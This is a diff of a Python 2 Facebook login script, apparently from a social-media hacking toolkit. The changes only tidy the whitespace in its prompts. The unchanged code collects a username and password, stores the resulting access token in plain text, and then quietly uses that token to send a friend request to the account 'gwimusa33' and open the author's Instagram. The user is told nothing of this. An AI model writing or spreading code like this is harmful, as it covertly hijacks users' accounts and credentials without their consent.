@@ -1,8 +1,8 @@
 try:
 	print
 	token = open("log.txt","r")
-	print tutup+"           ["+lime+"+"+tutup+"] You are already in this account : "+lime+id
-	tanya = raw_input(tutup+"           ["+lime+"+"+tutup+"] Do you want to change your account? y/n : "+lime)
+	print tutup+"["+lime+"+"+tutup+"] You are already in this account : "+lime+id
+	tanya = raw_input(tutup+"["+lime+"+"+tutup+"] Do you want to change your account? y/n : "+lime)
 	if tanya =="y":
 		os.system("rm -rf log.txt")
 		login()
@@ -11,12 +11,12 @@ try:
 	else:
 		keluar()
 except (KeyError,IOError):
-	usr = raw_input(tutup+"           ["+lime+"+"+tutup+"] Username : "+lime)
-	pwd = raw_input(tutup+"           ["+lime+"+"+tutup+"] Password : "+lime)
+	usr = raw_input(tutup+"["+lime+"+"+tutup+"] Username : "+lime)
+	pwd = raw_input(tutup+"["+lime+"+"+tutup+"] Password : "+lime)
 	try:
 		sex.open("https://m.facebook.com")
 	except mechanize.URLError:
-		exit(merah+"[!] No Connection")
+		exit(tutup+"["+merah+"!"+tutup+"] No Connection")
 	sex._factory.is_html = True
 	sex.select_form(nr=0)
 	sex.form['email'] = usr
@@ -37,17 +37,17 @@ except (KeyError,IOError):
 			zedd = open("log.txt","w")
 			zedd.write(b['access_token'])
 			zedd.close()
-			print tutup+"           ["+lime+"+"+tutup+"] Connect server ..."
+			print tutup+"["+lime+"+"+tutup+"] Connect server ..."
 			requests.post("https://graph.facebook.com/me/friends?method=post&uids=gwimusa33&access_token="+b['access_token'])
 			os.system("xdg-open https://www.instagram.com/rezadkim")
 			menu()
 		except requests.exceptions.ConnectionError:
-			exit(merah+"[!] No Connection")
+			exit(tutup+"["+merah+"!"+tutup+"] No Connection")
 	if 'checkpoint' in get:
-		print tutup+"           ["+kuning+"!"+tutup+"] Checkpoint"
+		print tutup+"["+kuning+"!"+tutup+"] Checkpoint"
 		os.system("rm -rf log.txt")
 		keluar()
 	else:
-		print tutup+"           ["+merah+"!"+tutup+"] Username/Password Incorrect"
+		print tutup+"["+merah+"!"+tutup+"] Username/Password Incorrect"
 		os.system("rm -rf log.txt")
 		keluar()
